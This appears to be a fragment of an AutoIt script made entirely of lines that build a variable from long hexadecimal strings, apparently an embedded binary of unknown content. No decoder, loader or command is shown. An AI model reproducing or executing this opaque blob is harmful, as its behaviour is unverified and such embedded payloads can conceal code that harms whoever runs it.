    $sHex &= "6F7CD352971BE9E4779A328F647B044082E5C15DA6E83D8A227E0BF904EC23A98321E8CB2BF4D2918CBF0BE899E39111A21CFE93033D8E24CC13F4498F41417F6A1A804565A1C17801A3C7C3084B80A68EB51A5F796226856F67236A3083143046C0AEA3663E1A084B8E58A4450D5109585A18ABB3D97E906DE13A5C1805E733A28C759B51B877080DEA9BF7D919DA45DC245B0A804306559B60DDB4D1AF13A3289C24B079434CB7C8D0BAD51789490C952463108100AC18B33F602590027B980B3843B7FC97E9C0054DEC134DA48D5019F14887082B75FC6E02A664610DF443AB1D423CF3060537FC89010C0A49E51E9B6960DEE37FD0A305641F2F0C7AA59A0168C298B89B20F755FCCE8443F7177E450A027E08F5C03AF105A8376C2E362B7E5AD8EB9829448A43F06F04CDD21F1303DE275794669F89EB156D60E1E7D84A10A18904914682635B042553C4AC559404FA077197411F65C28107F0AD65FA6579F7FA9FE025812302FC5533037F88F8C1FA032783E13FD0C00BF9D34D141177381858CD404C22A6C0200B469EE06C7834B21C6D794F8FD8872F95BAEB4AA9F7D0DE55486EAD234B25F53D6C3415D9A035F072C29490F5DE05BB59DA1B98F52903446B2449AF6D1F224641BAC3D92B4520E69E920A11A201087F407104180C5E5966342904A801323F0AF636A9F282062A4D21EDFFC33A08022F00E96AE3AFAB04D62DD7032D348D040BCD9D942E2DF3BF3714BA0E6A100D25980CC90E3ADC3885108DA1B4B04B9A16EB2DE80857ABDA6413E96BE810A06B9F4895D9C6D2F5C0483CF0949E48C075FA1CD3C49751A1B90FB886A050E7FDA860E28996C4BDDB9865E3442F69A8AC4F18B383B2918A9AD3C1040607AB25223C02C4506DDD5F1241E2786FD87B1AA1CFBE4AE760CC031127DC3A44E00D8CEE38ED18D702DA9A96334B5AE0416EEEDC10B1663D1390F03BA9FF15688B7786340BD4277D016B26A457E30337347907535AAE00A9B0DD26FF93216D233FA60A122D8325C3063745AD02074D17ADA55AD7A453224EF4D43CD7D059C040F990BC880EEF7C932C1EAC513BC14071A9FBCB968551407F0841708A042BEB461D0A097A22664D1DDC20B03BF03885B31197EF45F8BF9341440640A5E06B52482683EA051F267E44890C0F877DF5EE2919D7053D10FCFBB11CF26DA13CFD12FAECDC364A0C06D98E238DC1108EF44F5E460B702AD777008BC320972602359AE02337E882DE597AFFA0716924ED1B915EFCDCA7F024A7E0A3456D9D00F15BFFF1E26230A04FDC7241600CC12BD8268E06464C67485CC40BD4652C211334446F3B39A34DB0358FFBD0230E883849147101F06CE9D0C1A2C3B761DCD11A1047C7CB1100468F0DBD14A6BDC893C49F101EA35DE81A4D48"
    $sHex &= "AE30A079F324F3BCB76290DA3B2606300E3A44CDF3BC673D018006B9E7F93CACE3799E1677BAFABF9B7A55253F3E0E8B8210A3C9E8429E6EEA99C945F8505DB090EB4249FF705745E1051D0923EA348C8D90E7163ACBBA819F0CAAB4859DF9E0020A6C8CC02B3B185ADDC02160C92B0A5F051D89B451E8277937BA4BC0C0DF0C5D5B3AB54A12DDEF0B54150E4F3820221C5117E90FB5430C5DA090E124A7B1AA4D7B41A1E0084C2250BF3C927403FEE89D9044680085BA980CE87591F4A0072A03DF0541885D6C193BA70128F535AC63E9F6831F02D6491813A53693253CC027F8FEABA8CDD1F7D270234820235024234D143B4ED2788DEF8B170CE29AF20B8D6CD17873BBECCE4B8860165E649064118CF303B8346A181C5C8518815D54E5851C9B554013EFA01D4814BA9BC4E90FBC271096D45D00ACD009C0036AEA626FBC61CE40AE82DCB0DFAFC1BCC37A8CFA88752D238C8D39B8E545E5AB8C539F4104DAEB681A8D645999835871A11458F37A2803128D57A6D1C6B402DAF5F945503644C73C0C890BC157D86D853B50DB8D8D7BE1C51BDC758B39402DDD6EDC45A0BE102035074DC0A8C68B0B01C792FE02CC0B4DB435DB4F1B5729D0F5027579057802C7F5C02B807B0190D0A2FBB31340656DA61E30224B78EE59109F645A54E8148F94209ACC89C61C1DDAC45DDC083E490BDC94F1CC3F54BFF6331B235676EB41209A6AA309E2603F11B0DB849E3C7D446FE916A0FC4A3AF3DA021948A1533A8C6BBA10DF2E7DD42A12119FE71149FC37FCBDFB86C0D05AF87108923C054F6A000105418C0A3267304143305B2E5CB9790C0CEBECA1946A4884D60C10FD5002AE4B0B7F4026809869F8FB3D701E78D51FDE8E886C030C55F92A433A2697636ADD96912151025C2E338D8DB2A6E14F3914CDC0ED028815F611A07513439F10422856611E2CF914D608D51CEA44F3786B36707725C3D80383517E1F31438920981EF952694B7EF0D1B899922796B0514D0230CC0C0402F10901C3E7B1862B0DC5F00304A40506B783406C38E5030F30744563420030734F7A39CE811731F80109803B1742473B587233EB9145A3E788712305B888896D444027A8A1B955EFE8C3C836491B171092C027D9E8F181C130C8E8E8FFCE36C287A7B7C9021966896DD7826411791BA9584D49773188287CF1E52DE13A71851FEC8CA090BA31DB0DC44E6A05671A37DC7A4977E10C3EDE0A20747B6953909A0C0CCA1981025E264079888883A7F4070000100B0A9338103F816F0270B39160B113133775182FC39B5844FF87E00802F29CC62C47022F023F2E6DF8067E35A98580817CC6688B4DE820B8B5C84BE8C6708FC2A96C54119FC10A23B9663D7B8CC1A5902348E88F06FB5A0CF3843CC1C25D68C072"
    $sHex &= "0B28D8382911887D647441C99BA5F67525296C06A347A6C6B8049A9C52042C17E0F0E15AEB12E0337FC20407D5995F01D0C048E15A5FA73ECE4E7B6AF636F03B6884DBAC1820D23DFD63406A5C09105A3C094090D8F7321DA728936D654ED2DA30A7F374540BA79100D5D4014477CE084DC6A811BC72C631CA2BD869B28100065EE8C6D0052E0107E059E03B9BA3A7C0C718112CF6A6CAC25061ECBF170DAEBB98C0C7C6EA999404DEBAC72CF1C8B4DB0AF8764C1F2F7FF4501CC84F48C8C4E8293121AEE0F2FCF12D36EB286042BE6AC900E0C2B98644DD994AA689548B2DAE20A17B793C052A94DE50BA5ECCD2C4A5E091921844C8CC07098FD98F2CCC3F605BB189ED2BAA21BF08DBF85D29AC1AC09D49F8C0A37DDF513B6B555F5549C23DA24124DD894CDDF89210A4140C370F24E01B17B183C61FC2C4EA137B7F0F877EF3178D8E2DD87A054D0C4D1216B564E817CD043E1881FF1483F1A5350206FFEF17492D1623C7975894568D632A608185C97B8B261A8453BDC24E6CABF77B8DB0B7AD52513575F1C097607208273F8D6A515A9C4F0122F50DEAF4FB50DA6D552533F0E75E6CBB49E5E8FFCD1C7C52C8226920A2F25A14C8E8464B3097E549672EEDB4B687119D89263478EBA56DC08E487B28D50126EC3C140BA15D30B1B79C8E29ACD26A06BA50109E6015045E87865BE051306C50680AABA9630B1EA18451EB377949102B78FF73702004439F52872C008562536D601B21C6B9331FE6794F21D7054ACF06941DBAF79ECD4B564C042316CD26EF162D620648E001C9F707219906070108305AD050035F6BA04AC838AF266810811FCB05382C53154AD27B054FB96505AAA1C5ACF5883017D40082DF7AAD1B098FC44DAE36D0D207A845960E78EB4761CCE244671ECCCF0C120A13D773B9C0C49BCC05E4883FC0BA7F3F7C83C8733500BC2D86934D52500062B45503A109B9253E8AD58C5DA54A382181EFBC496A411DF2FF0CF47134013C05DE9BAA45A49603C438C92D0E067930A80474F4986ABB9A0041173FD40E831A7C0D8341BD01C1752559C7BEBB73F4EAA26B0A57A89DBE06C0EB39EB30BB34075400649FD8C80425D88914C8238BCA1EDC3530764EC027C0BDB60BA62155267AA7685CD3250B8EE160EBD05D6E1835000FA67547E240A5A07F38561A8C2B01A7E48D82221C945D20F5D4A46224751CAB20E2457D725C8DD561149E24114B5266D0E970A7A8AFDCAEEB90462C27BFF046484B6984EC8CB56022AC860118A186C90056A25209A60D3F1C8467CC0DCC0B04742D594D099AC80069A823492FC84CCB91DA32EB9401655CD26050C5E0DC5107728577DCDC3099D01013DC2B4CBA5DD4DCBF3B200EAA6441D38028C1AF03B1829C8D0A718E3442930806E40271"
    $sHex &= "3CE136443F6B9C73B90A0DE9DC3E2F09FF28963CCA007E30D35412E12485949251570253DE3582C0FF4A70200B7411180C0B7BBB0304C9208971044124EBAF8E387016F4DD42285FD42387321A3AE71A49D0D91D90F0F0DC20502C3013CA5907490E885D8F21CD10C9206F5A109E042A3DABDCDCED0A9D047C23088501D1A4614A47205204C528A26186A87D9FC007117F856C08D359DF7073527C02A45388216BB1BA0DE252E1AD865EB7A1786EED5BBD00E14BA7026A1656B4AF95C9746D13DD77E0E123887A4F04E0E43201990C5BB70DE953FCDC4A0A207AF43A9E071D09E0AA14E6450B9E96F98206045265002D2115FA0B7B0389D860A57E760D77A87724EB85B05B0F7810E10E1D13170D1C2A4B3F6A1331BA36AA85FC4EE9244D6C01C7C0658A712B79B441015ADBFC100573341C978F4BF24CC8E4F8AF35D038A03836DDF696BBA08102464F54B80102B208A115DCECA076D3091360066D6B7C27362D4F03DEC63BDF34783B4606F12FEB7EEA44235DB09D2C7DCA78C508A0D97158C031A33533740D22B712100728C8F8626855221A5724FF6D2BBA47B75AC04C17105108030C7C1304731A1C3A7457190344F3B3D203D9C355594E865A83BA0A461D1454ECB274AC75A2AC4270839CAC951318CE846FA116B5F083C6467711351006168C14E1970F30F06B2445F4D42492342007B7084EC8114F5C755A4713823260CC7B03A9B096CFC9708767838F40134BCCF99A3CA2715270304AC86CE189632B5DDD7C8A0897A0812DA2F1A71432438AF888118D81BEE512EE83949E141DC0FAC07542528B007D247C3CBF64B442A53ABCBCADBC25E8A3F5241F85BC2F143469F7F43FEBCD0D62FB4387C4522345406EC851C18CA345D2901C9C94C30B248CA6573B209656487FE9AAD11B3AB8382368A335490316B529A62D214DB81043CDC04963B9A8BB0386E486CFB4196FE1F24CAFB434C443011C7CB003283086AB152EFF0CFBEE6A4F1F309858633B54BA5C4E36DAA802A8A8A8680213829BA8DB2975D73904F5C46F923B48A72080ACEBBEC43423C9DA8A2888C8FD59213C011AC54F041E0C3C77CC81AF0C4D0C0BD8C1F8E58D872126B46D2FA5F41E69611D021048A6620DD5BDE8018A05724A011391741592F8C3A490A893807B5F9957137737BF9C2E3DA021E1C832190F2128AD671C891C96A15E530398FBDA7D096987B0C642C00734D4544C74A01A8C88C65D2D11B9050D8729B1F4AC69B99B49A4E93D30CC0EE80AE47C4E0F6C841881A1393424B2702470504A775CD1286419D899DEC21C3DA02B6A77386C780D49EBA3C5E8B0387068C5E708DBC1D1F12204078CA68D215D6790FE18945960B0D4B090B12AF2FE1086382F90FF730E62FFD47D0148295F8C6741583E1ACE"
    $sHex &= "F301E401B2333EE71C8E490EC9E7306901881D148C1703D33AC2E552A7134588EA9884BE5E7C8B3D1384B75D8017D2EC3C5C49CF1B7B2308986780CD80884820A2FBAB4A508086E4C98052B32E2C07602D752B486F36A385C18FF8A2F44C800A02415AF26E08D64F286A06E259E10B138F138DD29EB09F6F2D1C6C2A088933D7043FEC71397602736C80AE3921B5237604AD053342DE80749FCDE748D01F0BE4D733208DA2A01D0EB539D0F3682C37BC747F2A3C880CF506F9242AB8018D3BFF3372432BF77977A6705CDDB7A2B12B6A23149B066B4B0B9C702C71A1380201F57D9BE36CA486E45C90CD520F1870D16732207FA1864C1BE768518D7541589F925B36A67D6CFF0FB16D64D71327373648D49E1D1052DB519B4C072764407475381F5CB0058C1D6D401D1B80C21A886C49109281E2145136BCCB8CC6B7A411C4A162A902371B2554D750C04DC9E7A40D5FDD280887475F6C46462200F8BD493714B55007DBDF603042B815457F88C8095D05E7BC11F88B253733D27519F804E20ED90C051D86DE4FC87204331F9060F2412E04295ACC6043E9B1E71877A7D13955B7D87FA35101F7D00914051D0064E840868FDC758670C071335D20C81D0A3CA109DE5FE85F36121C36577A13F12A25743BF417EB18C20E48CA9B5F7A485843B873094EDC060E15B98EDC90BC62918FC9E82C009B0CE18A02DF831862844E77F0D03A9026F8EC85D510F08D63763F027120551860C81B07720F259F062F10E81BC42C242D3C4915AEA54B2D448A023325CF6C894C035403F24CC90460058B27B042406BEFAD540BC00D69FD022C1B32955802EF85F7813528118D96F20A351889ADCF6C6861C7320135694B1B178C17CC8054DC19E03711EBAECB5F2B8D543B25A402D7590BC993533A820239788929201BCD8E5C023D55A84B0F3CD924B1BCEF8A17508603A40E0EA92548B7955310D69C6308CA0685AD3D3C388207F51F48210522B0EE90EB12260B091A8647040315D6BE1273843503D985BC013FCA6152FBE8640A9CE8A5BE4566010F46660A098F5C8E26C5E6F4444C4CFA905E8C252B4CA1287A5CD94F824F640239E4037078001092097C2B090355F74C391B7ACA494889298A77E6E4664844D89341101ADE2DD83DB93878516EC62DF0C772816B9A431403E33A25430363935790831C928476016C01EBC88B834011402B0183548442672E403C3E12887C553C4138814C54445D900BC90432949CE79006471D8C7FB838AA5D00263C4B31A6B20CDB3D9F3D287AB6312E3BF3EFE3856403CD3111A7E5260199202E4C4372C86536A4461BAC55CA42CEFDA401D3F09751B4D0008723698EB801C0ACD2C0D19202AE34F2CAC934433434F48B95345E863273A24101D2A84193F456C7A93438"
    $sHex &= "226557007F7114A496B660D5508D9A492D9FFEF4430E790451DB666BC804E97148F400F92C909B1B3609A745404802E16838D2DF79DC921AACE1A779AB884EBC90CEA2BFEB0081E4DE720F6E0FD5D300C27B778B3D7728C33C48830CF0A42EDE483E40A4FE4515E00A69E411552802420639550767ADE4350079F214030A033087B45CF524C3C9020C1D249FF84A5F1849972420F4A220159D542E9E1C08A332811C3208F8FC9B85E401E9002D088829791EC903E9100492674A9E140520061104E4992C07CD93E940E5B70118531840C32995182017C0583B2FD48D6435A4741D4FD896101F954E09F8021C507E267976C8A43C8D31511A520CC8013207B31C1848AB440720292503842F0F022F9544CA244AD2C5A1D08DBB1B92427CCD100400D886F20E4B109E188519DAA217AF54980A50570C11CE003B06FD14D23CBD08C9070B3412082A5EC9910869BD0E1CC64492411C8421AF50E71145A40BE93CE05A9D34270B1CA7A433E10659C825048F3BB871EC1C77506F7429903814E0601539078E00E94F47BE023C715C00E012AAF54C8055850537060B79C0050DE96C0FCC4742C1646D25A97291225B08086403A45D6F550908FF1F582D8DBB37D1939393040404FB05ED095228B2ECFE200566CB5D888D3DCB5AB5002B69FF840BC15B1DC9984DB8C18D2F85A6D681379B3F8925C081C16FC025217B0B2ABFE00686AB0A8D0F580EB7D832DCDE0B8145182C4D841474E869B8B43121EA30E8147049C66207B92F5B5208C7E4FEE4FE62D48422E70072ED2C9CB3E4044BBB38EBB5DC6D6E8DB60828EC1F70394A487D0F4D15F816194154B352E66841B42A00112668AB80B1E12D46490AA1E16AE1FF9B02DEC62B6FE9146275AD9A192BBD1500AF8204A80D211E03947AB7EC2A5BF127012A106F7093821BF5715C11A42216F06F9570509CA07A6F9815F75A8F58BD00158B18BF49DDF9849CDCFE0A1C7C1CE2C616BBC93D70836175C9FD2FEF701001FF26BAA571C2BD49E3D63C52DE2DB0B708B1CA419BCAE0A6803C38ED142ACA201D93F872DCD8DB70419A1ED8119107932A40FEFBD8910DE184F52FDC61C0C460823BF10CE91DF9A30F5A74CD261BF8039C36B9434C45F85066D0E4869F69B6B46A0B53600652F5B8FE159407661B01EC2901399CA3055C8A48FC0399C3040B12A53E7B04C5316C206D090DC1A15A831E756FD902268E8749E0AC4397E0B95C4348CF85482ECDE5A48D9542858D0A07D25CC18D2D1A1DEB9614AB770308922099B5353CE91C50699FDF2D0661C30229CFB57325EF973E046C7F36C15632033F6CBF6B8A15245D91B45CC5C3A5B8FC06FD919518C850BC0250D307DCE0F3BD3E7141086EEB6C87F7406A0416EC8195ABF7D935E44A0E082F01D4BC18"
    $sHex &= "0319029FE9D88740E4856201E1A909AB189F7B0740E8D0EA2CC9C1DA10AE114FFE07AF90B4E5DF04D5DC7890864F09ED654CA05725277486ED518483F469444A2E5C077400A40904E294A2232D7CCCAE530E707E66CCFEBACC359EE1C0C44A5B642114E219262543CD2001D9403127124E3D849063E3A08DD406425D0F024B31F097812D29884249D6005C50598B830A15611D32CE4DEA385BDC831087F5EA5499742E290C7C13A5C7745374E2D1C24517A0416743778EDF1C467D76B3954A9C9C468911BD0B2D778D09E7B00C11F978D993AA95847878DEC8EB16178F232295010A5A1D022355E7849CC4C88FA6E85B536DC0D757C40AEE4350A48D13B6352210DD7F3FC8B16B8B6745E033020C573B481B396CA50EA6D3E076691DCC75C01295FB70519513DB3597BAC62D8FD739652CA2733CF99316831CCFCB7591950B79EA84A9BCFE853C39920101EA946E297282207196980B2D5DE7198C0A48B802DE08EF0B4DFC1164E400A85E31E4B8010A783485E1EB95CCC284BC7DEAA450E1A503101310440B0EBA4D1FB68594510F0A9B5688E7810494FE76B59E7121C7C9B46FE1EEE0E0043DB4B50BFA009049917961E828FC0A81B9B64C2F9978867511CBC06F114E0A0E90909D1384255F02F7EAC88C7BB4BE8D502A9C0C24D699312000559866E1A52B097B9A642CA096AA71412918478DECA9CFFB05A0B705751A062632C446F2DA00020101023F91A032859F60E00CB567FCBC81D13EB10A20551C894584007530F0144F840FE3BA65FF9DF4D3454C938C15D01A58C05573ECFB5F3C11782671674217894E1CDE7716BC1C302136C2022463E23E005424140D2A38DCE949A9F81806AC841592396F15448CC63F14BF6DDE9AC23F80837D80910016B172242C80810850301E1427D003120F2E9DB76A13D2E35981E02223DC47E13012C644ADE2E416835865096D82849E96C3CC170271629DEB670B55D43361C666493DB161276BF62CC4BC3541C24AD1E9D720191725ECA904D1C4050923DC6D90C4A9C42F791D18CF2290D5D32D18D6286D3C589384F7D9FFFB64084C7D14D089FA20BF8C05B439289E84F3220F0BED5B6EE4115E7CFF8D1314858A6BED9E160327E5F5541B5121B12B14175933FF4846A222B790D122E34D9F01BC1616CFEBB617F8C2943477194D4D20CDB4D0C1351CC5736913C54C81E034141052B848483480F8FB565A374F788D11BD0B1BE1D9BA04770DA3AD81189B46476CE10BE2E9438214678DFC7CD3AFCB4A200367027483FA6408CF6A02C7D274E78D2987B0E44DEDA115EE74197DAFEC9A78D8E81CBD5946AC2C5C7C544806D6D50613CC5D14F4092E2BB94649DBC122296D79A4674B87B56C51AAA62E366B282D983A2464E4BE261A13A107077D9AC4"
    $sHex &= "338C01D4D4319502D435D459D4446A037890C8034D20F43488FE81D68E220997A72DC0095C8534A3D4E144BD99C3536B09AAFCBA808CB88FB81B7425636958C065FBB4FDD891F91C35CDB83B6930624399718420185A06F2A45701694863C0ADF414E4409AD4F4F48887F832D123C04360A2103FD47231C18600DD1F538C4283A20F117D0BFD09EBEA2820012031E4DB5343030246D2A0738212078A8FBD0FEB6AF28325844BCF40FBC2F64BC610AF3349204570B2AD62515C01653CE88D118EA5A8EC086619C41F5C333211A21A2AA8806768349AFAAEC8218D559CD9920E0D8C8D9CEEC84DE1929E7EC5B87975932618F3172410107753C194F4328BCA1DD99090632890383CCB6848CA200E496BB1908C6A5327D2724D5840DC3B2A0394B22C3020C4EDC06E2531EB609B32325218786C3017DB606EA94064176BB55B4D281B1F981198514A2F0B5D672769A2AB075E0D79562351AEDC000663E3215A3340040FBA2B5DEBC78DC788D67571FE72558852EF1988AC5DBB73191151BA8DB75D390F6313BF702C2A552C65B377B80D3F79C906BD0F7A41CF49B629067BF87CC314401EC830FF2481428296839C846084606E24A0D772F001DF0C5AA6892009131C0C970A16BC2D14DA49268A6E8C2282DA8BD80C68B35B55929115354119A46EF3408582912B568D01AF141C12C98B759BE4B149AC15B41324AF8D0ABA244F450850EC065E40AE57083F41AB824E64C57541AA34490A7518C1AAA01723A5E00E09E5E83B8AF604ADCD29CDD04F80C55774460F957910F2552106039284402BA91C208440005E6E807A3D4F3D3F41AB94CBDBEB374F5A056D9F612135486C6B9751B104912A6805834468385F4FD524B630B58D8C1B4894D6928B21D1AAA08D370584CFF69E6D825B0681E4A916E2068395B426E8E83D5E1E7BC40DFF1E12B0AAFF3D41AB941CC92D46B1710508E05380278D0678F493BFE302EF9065DC629B34F14DE08B8D7E67688D5DEE1181BD85563DE50B9EE8720B12082B2FD4E80D943493CC2543A04B072269691AAFD51E29D044E84D40024F12576815754900C08581060F9C0CD0D15C33489F2569D4CB16883531D04CD820DE60816328A3699C2B7D1241CE82E40423B5652B00A0292739186603339D28B9CC89C2651647F5DAB1157130D32F0E35EC1C78285A35F4DC3B9127692C3352109C065E90F4472B03A06D72F4B57B07244E6A0BCF6D6C3B2911E75006409B536D27631938E1E79B6D3F00B25CC56A0BCBCE0432ACFD1328885A170A3E0CF1943E08E35B8D4B0C7ACE911F87870684E22193513D628D06B56FC46A1B01634B192F315BC5CF1D31D961CCA89C3660003D2999C00A9D98CD171C7FFC3DA1559233AB2F17900753587574FC40FA7A100D8D5FEA01"
    $sHex &= "F2A9A9EC8D45F0E46A6E504805198D580536E0DCE1230103BC0D63C9585548AFAD9BC955F0EDE6B581B5C9DCDC469F344E05EC4BDA69F601A962EDF9ECCDD6B408C047A920E9D3C8A1477D1AEE38531B6F39FC3DA6E9A1458A8E500881F9826271B7886E507EC6AA0DFCB44161EB5DCB10370BC2BFE08220C74CA5F4B0B1E12690F0E4BA3B42EB4633EE57251D8B8627BF2F7D5A4B6163E9ED484303ABE141F454856F28B91BA5B610DAEC8DAD7250A83B868D14BBB449691A02DB249E84F15D9D1AC904390B19F092C8EB17913724857A65B0DAD2169278839489BB1178D5B0B145932C669B3A8677201CA5655309055D1A2B3BE132C8C853AC98E4E4E4D01212A094594A9A22EBCD5F8C344A6A7A579394328C4A2348D3ACF8D5963C7877751E6C388CB5E478286318E9A4D74012365C5B699DDEF88145011B9884D818CC0055197785A49A017C947D641981EBD1F2674A7D08E6404D73290C4569B62E7537A006B625BD6998DB810B18DC0F38320F29D6287DA39DD84D9AB445CC94C5ECD3326E0610119884160B9C73BFDC067E4C3794027C326593B0A1398000231D7A48C76C3CD549F10BC0BA3F03A4EB266EF47408B10D6F4F84691A94ABF3A0844545C2E16AA365B4207D2CA02123D1D0C598C5254BC7046F74C202FAF73B40D3E20B55A82F523392F58C4803377A9C562F1976BA9CD5983C118AB885AF9CEB8A12B0B451F36429F23496F16E279C9CA6EB804CF4A45117A88C6C4D6812EFA21C59582741EF7E60D23A8B146094498C9C6AC84DC3F313DC3545B7228F8C1584585538A88980B9178AF1D96984C757256162AFB25784E3EA5AD2FCF47180419D02A9CD4D857412DF5A15A74F033C6B4E3711BF77B69AE0A53B0132A2849092781D0E400F64D8E86A2BE199A114170ACFAD1B3B20539D38586DA1327C9D25DED013243D6AE9507816583501E99582835C551FE86A4E697E6D49DA5874E151E856849F14F545B792A30216DBE8840A6AC3A97FC427DE42673D831364AD41CF3376C44269F84A18CB501CC05046305F430E4C60E11B856DD1384C96B12B7C2F41EFA8943546AF9A542602B510F4D6180C245D93A73012E709952C7BCE05DE2602F11DA6A730884CF88BBFBE4A62C78121568BB5963EB2745BBDFC913C1546552CE03058B49C88E948D8C0F8F384C6794C8D58131ECD75FC40EDD36A269E096597098F89E502BF3BD2B12D58978D403604ABD12F1A6B970F63B030B66A01EBAC036FB51833E783F02CFC2C6F6A083F16894B6E9A41315384010C709304618352C007A90C103108A1530F7149A1EA254E3DD961A913D1D091B7EB74336017350821DD18705D71D114CB16ADCB82BB7987B4314512E7182B8596ECFCC500E55FA6E44005320297C04659C71D2416"
    $sHex &= "E8632F04751FB5835E372E9F06B3EB1D2789596F4C0C84B920133784E097F0DB41162B865F5E8A1F068E5066B37936877EA4931C9077DE7BB6CD890788903E8F036C4E5C1E2B7B9EE7D9068689AD506BC66E6CDFD9DE70062C1E8B0F6E8ACA8685A17258BAEF66905806AEC02E0653130319549A3CB317040544E4B7C194DE0A0B011906C08EF63E19000C3A0D770121FDDD80FC0E0F101112070913141516131718A00691241F12CC414F733116B48E800E294C2A147D2602ACEF13F496355D0258865349535E160A01D1533D0202AB04F55169198FD69D2804D4E25E97ECFD0338DB42C30601BA34529128DF03886B538F1D3424D424225069968D47A7386E086D484A01ECD610FB29C13438596E67492D4C23FFC1B2DE4841411A061680312834758BB81B413D438CBE06A1E3EB1EE30A5978A24D216B05450CA9A084882A044999566E0B660A1B6984B0184DAA9C169E64243FF006604DEB4B9668296C3C22FD186F8C9F229FFCF41C9D98E1B8C458DA95F629A845E341F3413588C64136ECAD246ADA8A70617479F009A734889D583822E400B4D9D2295E9B53235825852FBD6DA06443D86A62FC5C3C70647CB4D404AEEC423ACCB0CB20AA69E8F0145703750F441CD3B8C11F78AD6548CB79D155F90D5D629332D85E11C3CC28E0F8DD5700C0B82DF576810D5CB7E92616DE3699D64DE470741D1055E5395514D1BC691445E639450BF6258D6379C8510701831117023070FFC2DE4C2B55F2897517BF144BC2A71675D3747C216850C4891144E0700D22D25ED35BC6CDB6090D1CD0D07D2FF219F40DBF2DEA8902850F8584D330852607CC83CCB944620C0373D1588BAB5F03602751342679A0F7C896912A0D113FA171C978F7138453B82098CCDB06B098650D0005A93CAEE000E88662598BAB9F1C6BA59326E345213D06A43748808ED01F41537776E38200D04958D89A18D59AA8DDC061E39A035B296963937D136940775B4BF017B7C4C0B9F0620A5A7EA7089D862116F0D915F020E21157D33AD8309F1A66898B5099C065372892AC68434076D2BF48481D2105D8B421899F4CDA3968CB741034EC0F25EA0E470CF750BDAE858D234F841A05510702A38D185B3E03613D6F992806328D7FC35D6D45770103C3B1466D5F6FDA0D43A8A8ADABE8304BA74FC354E145A1A2A133901CE4230907F98C034DEC8D4141E8E029B08C6386BD5CBE68E3A05308019E8D1820F110BB5F86B1003C588D951642A6309B41DCD416087865BBA64584173CBE3DC9DED3406903F7FF0534D40BC69C3C97DC48DD811D8755940033A77007C23AE42353B8006E371DE0E826ACC7D86B80B807EE192E0D718988D0D8C5A8F1788CA40D7579AA0A609C32314DA0F1704101D03346A79DEC04F53C4A38F4"
    $sHex &= "E894B2F0001A075B363A209362705AC7C0693A4462FAF4C82AE999328D28B23C0CA0D3B333C601621BF72230166083A26022700D9FD4157035C2448DBC2F2BD5A4497A01580C03930870E034BFA4A6BC306ED434DBE46FDCCA080A165BBB72495DC1593816142CF02345C0FB07451D3C344875E4C06DA426971F1E8B4DC0DC84225957211E1CBDF5B09CD75264376D0745673B359E3249C2EB49751338A7A4C1E5A6776C150C956DB7B66DA4DB3124ACC193670CB035E06E373E7A70207D2361EC10E7A40857818045B043DBEA4C23B472A21D9E5CE639343451481B6EEA10CC3648E060E9D5084E048E8A34AE673B52B3B489343D32380DD66484B3FCE871407808868F535807848B30D48733DA587B08408556A471E315A8E9491B433B2C37A8A753415E088B4DA838C4651806CA9D5C16C808E0142C4C022CE84E730B8987CC1A4471411A6F94139334873090C0F4A4D49436468EB5150835283C83F4872BEF90F879E2A4680C259C7887A32E9C2DB9559C63AC349825D8383ABE61D3E9E4411A6FD114180C465EEFC9080C240BC8E7A35BC873A49ED404C818C40BC3A449B0A827BC48185B243AD14386528C51E884754D53AEF8ECFC228343C005E9A04981720D87A42A6BA078862B68E2A0CE4F475A3AA9DDC2DF00C536450CD491D21ECFC556708029004598D744858C0144A2A1228D35048B9823945D2CA7343B56CCC78716758B2B92652E98C8884853D91416D2E18CE38C18AF1B289090F19C4CAC26ACE18FF5F490116708BE1B0820C36F016AEE469FE3E6A0E0B2850034706B342DC045447523485D77627B74BC9C4D852F186319A28D256808381C74D3310EEE48926B1C4C04D405814A14F0D3B385544253A72EA84170D8F3AD25D604B4856B320E1B1410E91C760CE10900FA1D4A905BA90BBC6BBF976844FDBCB0B68519F84095164641AF248D8A5BE6481981574B12F4CE165A8788017B74539E954634FFF8175060117131FF5261B3165C6C4D848128E9603A3812A5835006455B08AB84508F51BC85A519940F9B6ADD487E888B5588BC4B577B505ED08D6DD14F5991634F47D17488B89DB1A16AD185AAB8558C9BDBDCDB6BD01240C7302E8E8295466B2F1DA1E358B3B1A701E71680D515AC3716F89A0D88E5F281621D4FD2B329E080DB406B2FE1E0ADC3C4AD496E40DA76773DB106F9529A95F823955023699FB294B9E7C230A82A1F702CE08D30F14DA93AD4411F413B671A1ED66A32EA9F4047F2481A2040643866CB290BEF8D3231660B1586A922671F48182C2F4400070B707DB97A0043E9832588B840D0F3C0F3D78FB72F913456DAA5268D19AECDE4ED0132F122AFD5CA0877F5B6A1C44564E647E894A6241D0B4DF81AD8A3810B1B1C243DB402191F30800185"
    $sHex &= "60B7E3D13186DA67EBDBA74A0476031F059846A294A9F02D1A6235501F9F3C206D5C24A76513D7580DF3EB00C6E00A6DD8384CF8C655B7C4D5EED191DA265F84013471D516C1E0411D10CE35FF63C2B40BD3ECBAC4DE860C358180DA930C25707E9A7C072E85C6E809171301D04B78133FF02F248C160AA8E6C60D04E119ABC4A65077CB83F009C47DCBC41DEC58455092C4C51C3C2842F074018522DCFC153283F39175C7F3C889A611DF438DC80402750C9B986442F5F0C43810286F053CE82A0D955E69C4B86CB8BC78A6709AD6B8B554EB7ACBADB0A495493E10C4BCF9C89EA08284AC45BC7F750D6844B629AD4B424785D4644C756E9B9139C804CA1AC0753C4CE846B212D80706701D45A87E8F557E3D122EA855D80CF856022B87238B81774FDB447ADA75E835F00727A6AF3DB85583C446E98168A38CC4ACD34237F08300DE601C0DF7A14B9550C6FEEAB8ACC1701665638771E1562E6D434608200F39CF04000ACF10820A1AB43B80A56E66D042291C65B5368D3FB0C2A7459C74D5A52ED174E3D852156B44E900C610C40B113F3A668357E0015A736C52F0EB3F30A4A9045A3302DCACC84E720511E255C852B727ED0474886F1000893D4957E943CFF461C033A8078FB7401C835EBA8BE8DCA0C9FB23C4D6E86FCC3004B67ED51C5FCC1993B4B4C1F0CCD9C158444143F051F19E8D3757F7A3081EE486C9ED886D3A505839207302838812969E00919C1C246ECCF9902D203998826B98AC18CB88676BA017D81B0496506ADA3D28BCEE092F98E28DC380A8DB6CB62F06812D822C832E56740C24B279F8883AAE04521F938C648CB7A67443425F8415335AA4E00801FB4B8C1DBA9AD8776B84DEC8B083E32498502522AD0230A5A035948440F4C12E3F518FAEB084A1CA31A0D1B558A2FD4F1A0B44B81D75CBB4620E910C09AD2B53E82D22614F6C